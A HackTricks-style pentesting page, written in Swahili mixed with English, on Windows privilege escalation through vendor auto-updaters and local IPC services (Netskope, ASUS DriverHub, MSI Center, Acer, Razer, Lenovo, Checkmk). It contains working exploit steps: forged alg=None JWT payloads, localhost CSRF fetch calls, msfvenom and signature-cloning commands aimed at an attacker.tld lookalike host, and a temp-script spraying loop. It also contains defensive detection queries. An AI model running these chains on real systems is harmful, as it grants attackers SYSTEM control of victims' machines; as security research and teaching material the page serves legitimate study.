# Kutumia Vibaya Enterprise Auto-Updaters na Privileged IPC (mfano, Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unaeleza kwa jumla aina ya local privilege escalation chains za Windows zinazopatikana katika enterprise endpoint agents na updaters zinazowasilisha IPC surface yenye vikwazo vidogo na privileged update flow. Mfano unaowakilisha ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji mwenye privileges za chini anaweza kulazimisha enrollment kwenye server inayodhibitiwa na attacker, kisha kuwasilisha MSI hasidi ambayo SYSTEM service hu-install.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Mawazo muhimu unayoweza kutumia tena dhidi ya bidhaa zinazofanana:
- Tumia vibaya localhost IPC ya privileged service ili kulazimisha re-enrollment au reconfiguration kuelekea attacker server.
- Tekeleza update endpoints za vendor, wasilisha rogue Trusted Root CA, kisha elekeza updater kwenye package hasidi “signed”.
- Epuka signer checks dhaifu (CN allow-lists), digest flags za hiari, na MSI properties zisizo na vikwazo.
- Ikiwa IPC “imesimbwa”, derive key/IV kutoka kwenye machine identifiers zinazosomwa na kila mtu na kuhifadhiwa kwenye registry.
- Ikiwa service inawazuia callers kwa image path/process name, inject kwenye process iliyo kwenye allow-list au spawn moja ikiwa suspended, kisha bootstrap DLL yako kupitia minimal thread-context patch.

---
## 1) Kulazimisha enrollment kwenye attacker server kupitia localhost IPC

Agents wengi husambaza user-mode UI process inayowasiliana na SYSTEM service kupitia localhost TCP kwa kutumia JSON.

Ilibainika kwenye Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Tengeneza JWT enrollment token ambayo claims zake zinadhibiti backend host (kwa mfano, AddonUrl). Tumia alg=None ili signature isihitajike.
2) Tuma IPC message inayoita provisioning command pamoja na JWT yako na tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) The service inaanza kutuma maombi kwenye rogue server yako kwa ajili ya enrollment/config, kwa mfano:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Ikiwa caller verification inategemea path/name, anzisha ombi kutoka kwa vendor binary iliyo allow-listed (tazama §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Hijacking update channel ili kuendesha code kama SYSTEM

Mara client inapowasiliana na server yako, tekeleza endpoints zinazotarajiwa na ielekeze kwenye attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → Rudisha JSON config yenye updater interval fupi sana, kwa mfano:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return PEM CA certificate. Huduma huiweka kwenye Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Kukwepa ukaguzi wa kawaida unaoonekana kwenye mazingira halisi:
- Signer CN allow-list: huduma inaweza kukagua tu ikiwa Subject CN ni “netSkope Inc” au “Netskope, Inc.”. Rogue CA yako inaweza kutoa leaf yenye CN hiyo na kusaini MSI.
- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. Hakuna enforcement wakati wa installation.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) huzima cryptographic validation ya ziada.

Result: huduma ya SYSTEM husakinisha MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
ikiendesha arbitrary code kama NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Somo la patch-bypass: ikiwa vendor anajibu kwa kuweka allow-list ya seti ndogo ya domains “trusted” badala ya kuthibitisha chanzo cha update kwa cryptographic authentication, tafuta redirectors au reverse proxies zinazomilikiwa na vendor ambazo bado zinakuruhusu kuelekeza traffic. Katika hali ya Netskope, utafiti wa umma uliofuata ulionyesha kuwa allow-list ya enzi ya R129 bado ingeweza kutumiwa kupitia `rproxy.goskope.com`, ambayo ili-proxy maudhui ya Azure App Service yaliyodhibitiwa na attacker. Chukulia hostname allow-lists kama speed bump, si kama trust boundary.<sup>[[14]](#references)</sup>

---
## 3) Forging encrypted IPC requests (when present)

Kuanzia R127, Netskope ilifunga IPC JSON ndani ya sehemu ya encryptData iliyoonekana kama Base64. Reversing ilionyesha AES yenye key/IV zilizotokana na registry values zinazoweza kusomwa na user yeyote:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers wanaweza kuzalisha encryption upya na kutuma commands halali zilizofichwa kutoka kwa standard user.<sup>[[1]](#references)[[2]](#references)</sup> Ushauri wa jumla: ikiwa agent ghafla inaanza “encrypt” IPC yake, tafuta device IDs, product GUIDs na install IDs chini ya HKLM kama material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Baadhi ya services hujaribu kuthibitisha peer kwa kutambua PID ya TCP connection na kulinganisha image path/name dhidi ya vendor binaries zilizo kwenye allow-list, zikiwa chini ya Program Files (kwa mfano, stagentui.exe, bwansvc.exe, epdlp.exe).

Njia mbili za vitendo za kukwepa:
- DLL injection ndani ya process iliyo kwenye allow-list (kwa mfano, nsdiag.exe) na ku-proxy IPC kutoka ndani yake.
- Spawn binary iliyo kwenye allow-list ikiwa suspended na bootstrap proxy DLL yako bila CreateRemoteThread (tazama §5) ili kutimiza driver-enforced tamper rules.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products mara nyingi husambaza minifilter/OB callbacks driver (kwa mfano, Stadrv) ili kuondoa dangerous rights kutoka handles zinazoelekea kwenye protected processes:
- Process: huondoa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: huweka restriction kwenye THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

User-mode loader inayotegemeka na inayoheshimu constraints hizi:
1) CreateProcess ya vendor binary yenye CREATE_SUSPENDED.
2) Pata handles ambazo bado unaruhusiwa: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwenye process, na thread handle yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au THREAD_RESUME pekee ikiwa unapatch code kwenye RIP inayojulikana).
3) Overwrite ntdll!NtContinue (au early, guaranteed-mapped thunk nyingine) kwa stub ndogo inayoiita LoadLibraryW kwenye DLL path yako, kisha inaruka kurudi.
4) ResumeThread ili ku-trigger stub yako ndani ya process na kupakia DLL yako.

Kwa kuwa hukuwahi kutumia PROCESS_CREATE_THREAD au PROCESS_SUSPEND_RESUME kwenye process iliyokuwa tayari protected (uli-create), policy ya driver inatimizwa.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) hu-automate rogue CA, malicious MSI signing na kuhudumia endpoints zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ni custom IPC client inayounda arbitrary (optionally AES-encrypted) IPC messages na inajumuisha suspended-process injection ili kuanzisha mawasiliano kutoka kwenye binary iliyo kwenye allow-list.<sup>[[4]](#references)</sup>

## 7) Fast triage workflow for unknown updater/IPC surfaces

Unapokabiliana na endpoint agent mpya au suite ya “helper” ya motherboard, workflow fupi kwa kawaida inatosha kubaini ikiwa unaangalia privesc target yenye matumaini:<sup>[[6]](#references)</sup>

1) Enumerate loopback listeners na uzihusishe tena na vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Orodhesha named pipes zinazowezekana:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Chunguza routing data inayotegemea registry inayotumiwa na IPC servers zenye plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Anza kwa kutoa endpoint names, JSON keys, na command IDs kutoka kwa user-mode client kwanza. Packed Electron/.NET frontends mara nyingi hu-leak schema kamili:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Tafuta trust predicate halisi, si tu code path inayoishia kuzindua process:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Mifumo inayostahili kupewa kipaumbele:
- `CryptQueryObject`/uchanganuzi wa certificate bila `WinVerifyTrust` kwa kawaida humaanisha kwamba “certificate ipo” ilichukuliwa kuwa “certificate inaaminika”, hivyo kuwezesha certificate cloning au mbinu nyingine za fake-signer.
- Ukaguzi wa substring/suffix kwenye `Origin`, `Referer`, download URLs, majina ya process, au signer CNs si authentication. `contains(".vendor.com")` kwa kawaida inaweza kutumiwa vibaya kwa kutumia attacker-controlled lookalike domains.
- Ikiwa GUI yenye privileges ndogo ndiyo huamua “file inaaminika” na SYSTEM broker hutumia tu matokeo hayo, kupatch au kureimplement client-side DLL/JS mara nyingi hupita boundary hiyo kabisa (Razer-style split validation).
- Ikiwa broker inanakili payload hadi `%TEMP%`/`C:\Windows\Temp` kisha kuivalidate au kuipangia kazi kutoka kwenye path hiyo, jaribu mara moja windows za TOCTOU replacement na sibling plugin modules zinazofichua wrappers mbadala za `ExecuteTask()` zenye checks dhaifu.<sup>[[6]](#references)</sup>

Kwa targets zinazotumia named pipes kwa wingi, PipeViewer ni njia ya haraka ya kuona DACLs dhaifu na pipes zinazoweza kufikiwa remotely kabla hujaanza kureverse protocol kwa kina.<sup>[[11]](#references)</sup>

Ikiwa target inawathibitisha callers kwa kutumia PID, image path, au process name pekee, ichukulie hiyo kama kikwazo cha kasi badala ya boundary: kuinject kwenye client halali, au kuanzisha connection kutoka kwenye process iliyo allow-listed, mara nyingi hutosha kutimiza checks za server. Kwa named pipes hasa, [ukurasa huu kuhusu client impersonation na pipe abuse](named-pipe-client-impersonation.md) unaeleza primitive hii kwa kina zaidi.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Toleo jipya linalostahili kutafutwa ni **signed-client RPC broker**: process ya desktop yenye privileges ndogo iliyosainiwa na Lenovo huwasiliana na service ya SYSTEM, na service hiyo hupeleka JSON commands kwenye seti ya add-ins zinazoelezwa kwa XML chini ya `%ProgramData%`. Mara tu code execution inapopatikana **ndani ya signed client yoyote iliyokubaliwa**, kila contract yenye `runas="system"` huwa sehemu ya attack surface yako.<sup>[[15]](#references)</sup>

High-value primitives zilizobainika katika utafiti wa Lenovo Vantage:
- **Kumwamini caller kwa sababu imesainiwa na vendor**: researchers walifikia authenticated context kwa kunakili Lenovo-signed EXE hadi kwenye writable directory na kutimiza DLL side-load (`profapi.dll`) ili arbitrary code iendeshe ndani ya client ambayo service ilikuwa tayari inaiamini.
- **Manifest-driven attack surface discovery**: add-ins hutangazwa chini ya `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; contracts kadhaa huendesha kama `SYSTEM`, hivyo kuenumerate manifests hizo mara nyingi hufichua privileged verbs halisi kwa haraka kuliko kureverse broker yenyewe.
- **Per-command bugs nyuma ya authenticated channel**: baada ya kuingia ndani ya trusted client, public research ilipata path-traversal + race conditions kwenye update/install verbs, raw-SQL abuse kwenye privileged settings databases, na substring-based registry path checks zilizowezesha writes nje ya hive iliyokusudiwa.

Recon muhimu kwenye target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Mafunzo ya vitendo: kila helper suite inapofichua broker ambayo kwanza huthibitisha **caller process** na kisha kupeleka maombi kwenye amri nyingi za plugin/add-in, usiishie baada ya kupita ukaguzi wa awali wa trust. Dump manifest/contract table na ufanye fuzz kwa kila high-privilege verb kivyake; authenticated channel kwa kawaida huficha bugs kadhaa za hatua ya pili.

---
## 1) Browser-to-localhost CSRF dhidi ya privileged HTTP APIs (ASUS DriverHub)

DriverHub husafirisha huduma ya HTTP ya user-mode (ADU.exe) kwenye 127.0.0.1:53000 ambayo hutazamia browser calls zinazotoka https://driverhub.asus.com. Origin filter hufanya tu `string_contains(".asus.com")` kwenye Origin header na kwenye download URLs zinazofichuliwa na `/asus/v1.0/*`. Host yoyote inayodhibitiwa na attacker, kama vile `https://driverhub.asus.com.attacker.tld`, kwa hiyo hupita ukaguzi na inaweza kutuma state-changing requests kutoka JavaScript.<sup>[[6]](#references)</sup> Tazama [Misingi ya CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa mifumo ya ziada ya bypass.

Mtiririko wa vitendo:
1) Sajili domain inayojumuisha `.asus.com` na uhost malicious webpage hapo.
2) Tumia `fetch` au XHR kuita privileged endpoint (kwa mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma JSON body inayotarajiwa na handler – packed frontend JS inaonyesha schema hapa chini.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Hata PowerShell CLI iliyoonyeshwa hapa chini hufaulu wakati Origin header inapo-spoofiwa kuwa thamani inayoaminika:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Kwa hiyo, ziara yoyote ya browser kwenye tovuti ya attacker huwa CSRF ya ndani ya 1-click (au 0-click kupitia `onload`) inayoendesha helper ya SYSTEM.

---
## 2) Uthibitishaji usio salama wa code-signing na cloning ya certificate (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` hupakua executables za kiholela zilizobainishwa kwenye JSON body na kuzihifadhi kwenye `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Uthibitishaji wa Download URL hutumia substring logic ileile, hivyo `http://updates.asus.com.attacker.tld:8000/payload.exe` inakubaliwa. Baada ya kupakua, ADU.exe hukagua tu kwamba PE ina signature na kwamba Subject string inalingana na ASUS kabla ya kuiendesha – hakuna `WinVerifyTrust`, wala chain validation.

Ili kuweaponize flow:
1) Tengeneza payload (kwa mfano, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone signer wa ASUS ndani yake (kwa mfano, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` kwenye domain inayofanana na `.asus.com` na u-trigger UpdateApp kupitia browser CSRF iliyo hapo juu.

Kwa sababu filters za Origin na URL zinategemea substring, na signer check hulinganisha strings pekee, DriverHub hupakua na kutekeleza attacker binary chini ya elevated context yake.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU ndani ya updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

SYSTEM service ya MSI Center hufichua TCP protocol ambapo kila frame ni `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Core component (Component ID `0f 27 00 00`) husafirisha `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Handler yake:
1) Hunakili executable iliyotolewa kwenye `C:\Windows\Temp\MSI Center SDK.exe`.
2) Huthibitisha signature kupitia `CS_CommonAPI.EX_CA::Verify` (certificate subject lazima iwe sawa na “MICRO-STAR INTERNATIONAL CO., LTD.” na `WinVerifyTrust` ifanikiwe).
3) Huunda scheduled task inayoendesha temp file kama SYSTEM ikiwa na attacker-controlled arguments.

File iliyonakiliwa haifungwi kati ya verification na `ExecuteTask()`. Attacker anaweza:
- Kutuma Frame A inayoelekeza kwenye binary halali iliyosainiwa na MSI (inahakikisha signature check inapita na task inawekwa kwenye queue).
- Kuishindanisha na jumbe za Frame B zinazorudiwa zinazoelekeza kwenye malicious payload, na ku-overwrite `MSI Center SDK.exe` mara tu baada ya verification kukamilika.

Scheduler inapowasha task, hutekeleza payload iliyowekwa upya chini ya SYSTEM licha ya kuwa imevalidate file ya awali. Exploitation ya kuaminika hutumia goroutines/threads mbili zinazospam CMD_AutoUpdateSDK hadi TOCTOU window ishindwe.<sup>[[6]](#references)</sup>

---
## 2) Kutumia vibaya custom SYSTEM-level IPC na impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Kila plugin/DLL inayopakiwa na `MSI.CentralServer.exe` hupokea Component ID iliyohifadhiwa chini ya `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Baiti 4 za kwanza za frame huchagua component hiyo, hivyo attackers wanaweza kuelekeza commands kwenye modules zozote.
- Plugins zinaweza kufafanua task runners zao wenyewe. `Support\API_Support.dll` hufichua `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` na huita moja kwa moja `API_Support.EX_Task::ExecuteTask()` bila signature validation – local user yeyote anaweza kuielekeza kwenye `C:\Users\<user>\Desktop\payload.exe` na kupata SYSTEM execution kwa uhakika.
- Kusniff loopback kwa Wireshark au ku-instrument .NET binaries katika dnSpy hufichua haraka mapping ya Component ↔ command; custom Go/ Python clients wanaweza kisha kureplay frames.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes na impersonation levels
- `ACCSvc.exe` (SYSTEM) hufichua `\\.\pipe\treadstone_service_LightMode`, na discretionary ACL yake inaruhusu remote clients (kwa mfano, `\\TARGET\pipe\treadstone_service_LightMode`). Kutuma command ID `7` pamoja na file path huinvoke process-spawning routine ya service.
- Client library hu-serialize magic terminator byte (113) pamoja na args. Dynamic instrumentation kwa Frida/`TsDotNetLib` (tazama [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) kwa vidokezo vya instrumentation) huonyesha kwamba native handler hu-mapping value hii kwenye `SECURITY_IMPERSONATION_LEVEL` na integrity SID kabla ya kuita `CreateProcessAsUser`.
- Kubadilisha 113 (`0x71`) kuwa 114 (`0x72`) huingia kwenye generic branch inayohifadhi SYSTEM token kamili na kuweka high-integrity SID (`S-1-16-12288`). Kwa hiyo, binary iliyozinduliwa huendeshwa kama SYSTEM isiyo na vizuizi, ndani ya mashine na cross-machine.
- Changanya hilo na exposed installer flag (`Setup.exe -nocheck`) ili kuanzisha ACC hata kwenye lab VMs na kujaribu pipe bila vendor hardware.<sup>[[6]](#references)</sup>

IPC bugs hizi zinaonyesha kwa nini localhost services lazima zilazimishe mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering), na kwa nini kila module ya “run arbitrary binary” helper lazima itumie signer verifications zilezile.

---
## 3) COM/IPC “elevator” helpers zinazoegemezwa na weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 iliongeza pattern nyingine muhimu katika family hii: user mwenye low privileges anaweza kuomba COM helper izindue process kupitia `RzUtility.Elevator`, huku uamuzi wa trust ukikabidhiwa user-mode DLL (`simple_service.dll`) badala ya kutekelezwa kwa uthabiti ndani ya privileged boundary.

Observed exploitation path:
- Instantiate COM object `RzUtility.Elevator`.
- Ita `LaunchProcessNoWait(<path>, "", 1)` ili kuomba elevated launch.
- Katika public PoC, PE-signature gate ndani ya `simple_service.dll` hu-patchiwa kabla ya kutuma request, na hivyo kuruhusu executable yoyote iliyochaguliwa na attacker kuzinduliwa.<sup>[[6]](#references)</sup>

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Mafunzo ya jumla: unapofanya reverse engineering ya suites za “helper”, usiishie kwenye localhost TCP au named pipes. Kagua COM classes zenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha thibitisha ikiwa privileged service inathibitisha target binary yenyewe au inaamini tu matokeo yaliyokokotolewa na patchable user-mode client DLL. Muundo huu unatumika zaidi ya Razer: muundo wowote uliogawanyika ambapo high-privilege broker hutumia uamuzi wa allow/deny kutoka upande wa low-privilege ni candidate ya privesc surface.


---
## Utekelezaji unaotabirika wa temp script wakati wa MSI repair (Checkmk Agent / CVE-2024-0670)

Baadhi ya Windows agents bado hutekeleza vitendo vya privileged kwa kuandika `.cmd` ya muda ndani ya `C:\Windows\Temp` na kuiendesha kama `SYSTEM`. Ikiwa filename inatabirika na service haiunde upya files zilizopo kwa usalama, low-privileged user anaweza kuunda mapema temp file ya baadaye kama **read-only** na kufanya privileged process itekeleze content inayodhibitiwa na attacker badala ya script yake yenyewe.

Ilibainika katika vulnerable Checkmk Agent builds:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: MSI **repair** ya cached agent package<sup>[[8]](#references)[[9]](#references)</sup>

Practical workflow:
1. Kadiria PID range inayowezekana kutokana na process IDs za sasa au agent PID inayoendesha.
2. Andika payload fupi ya **ASCII** `.cmd` (`Set-Content -Encoding Ascii` au `cmd.exe` redirection; epuka PowerShell output ya UTF-16 kwa batch files).
3. Spray `C:\Windows\Temp\cmk_all_<PID>_1.cmd` katika candidate range na uweke kila file kuwa read-only.
4. Trigger repair ya cached MSI ili privileged service ijaribu kuunda upya, kisha itekeleze temp script.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Ikiwa product iliyo hatarini imewekwa kwa kutumia Windows Installer, linganisha MSI iliyohifadhiwa yenye jina linaloonekana kuwa la nasibu chini ya `C:\Windows\Installer` na jina la product yake kabla ya kuanzisha repair:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Maelezo ya kiutendaji:
- `qwinsta` ni muhimu wakati `msiexec /fa` inashindwa kutoka kwenye WinRM shell isiyo ya interactive na unahitaji kuelewa ikiwa session iliyopo ya desktop/disconnected inaweza kuanzisha repair ipasavyo.<sup>[[7]](#references)</sup>
- Pattern hii inatumika pia kwa endpoint agents na updaters wengine ambao **huandaa temp scripts katika maeneo yanayoweza kuandikiwa na kila mtu na baadaye kuzitekeleza kama SYSTEM**. Fanya majaribio ya majina yanayotabirika, ukosefu wa exclusive create semantics, na repair/update flows zinazoweza kuanzishwa unapohitaji.

---
## Utekaji wa remote supply-chain kupitia uthibitishaji dhaifu wa updater (WinGUp / Notepad++)

Kati ya Juni 2025 na Desemba 2025, attackers waliodukua hosting infrastructure iliyokuwa nyuma ya Notepad++ update flow waliwasilisha malicious manifests kwa victims waliochaguliwa. Updaters za zamani zilizotumia WinGUp hazikuthibitisha kikamilifu uhalali wa update, hivyo jibu hasidi la XML lingeweza kuelekeza clients kwenye URLs zinazodhibitiwa na attackers. Kwa kuwa client ilikubali maudhui ya HTTPS bila kulazimisha trusted certificate chain na valid PE signature kwenye installer iliyopakuliwa, victims walipakua na kutekeleza NSIS `update.exe` iliyotiwa trojan.<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (hakuna local exploit inayohitajika):
1. **Infrastructure interception**: dukuza CDN/hosting na ujibu update checks kwa attacker metadata inayoelekeza kwenye malicious download URL.
2. **Trojanized NSIS**: installer hupakua/tekeleza payload na kutumia execution chains mbili:
- **Bring-your-own signed binary + sideload**: bundle signed Bitdefender `BluetoothService.exe` na uweke malicious `log.dll` kwenye search path yake. Signed binary inapoendeshwa, Windows husideload `log.dll`, ambayo hudecrypt na ku-load kwa reflectively Chrysalis backdoor (iliyolindwa na Warbird + API hashing ili kuzuia static detection).
- **Scripted shellcode injection**: NSIS hutekeleza compiled Lua script inayotumia Win32 APIs (kwa mfano, `EnumWindowStationsW`) kuingiza shellcode na kuandaa Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Mambo ya kuzingatia kwa hardening/detection ya auto-updater yoyote:
- Lazimisha **certificate + signature verification** ya installer iliyopakuliwa (pin vendor signer, kataa CN/chain zisizolingana) na saini update manifest yenyewe (kwa mfano, XMLDSig). Zuia redirects zinazoongozwa na manifest isipokuwa zimethibitishwa.
- Chukulia **BYO signed binary sideloading** kama post-download detection pivot: toa alert signed vendor EXE inapopakia DLL name kutoka nje ya canonical install path yake (kwa mfano, Bitdefender inapopakia `log.dll` kutoka Temp/Downloads) na updater inapoweka/tekeleza installers kutoka temp zenye non-vendor signatures.
- Fuatilia **malware-specific artifacts** zilizoonekana katika chain hii (zinafaa kama generic pivots): mutex `Global\Jdhfv_1.0.1`, `gup.exe` writes zisizo za kawaida kwenda `%TEMP%`, na Lua-driven shellcode injection stages.
- Notepad++ ilijibu kwa kuimarisha WinGUp katika v8.8.9 na matoleo ya baadaye: XML inayorejeshwa sasa imesainiwa (XMLDSig), na builds mpya zaidi zinalazimisha certificate + signature verification ya installer iliyopakuliwa badala ya kutegemea transport pekee.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ikianzisha installer isiyo ya Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Mifumo hii inatumika kwa updater yoyote inayokubali unsigned manifests au inayoshindwa kuweka kikomo kwa installer signers—network hijack + malicious installer + BYO-signed sideloading husababisha remote code execution chini ya mwonekano wa updates “trusted”.

---
## Marejeo
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
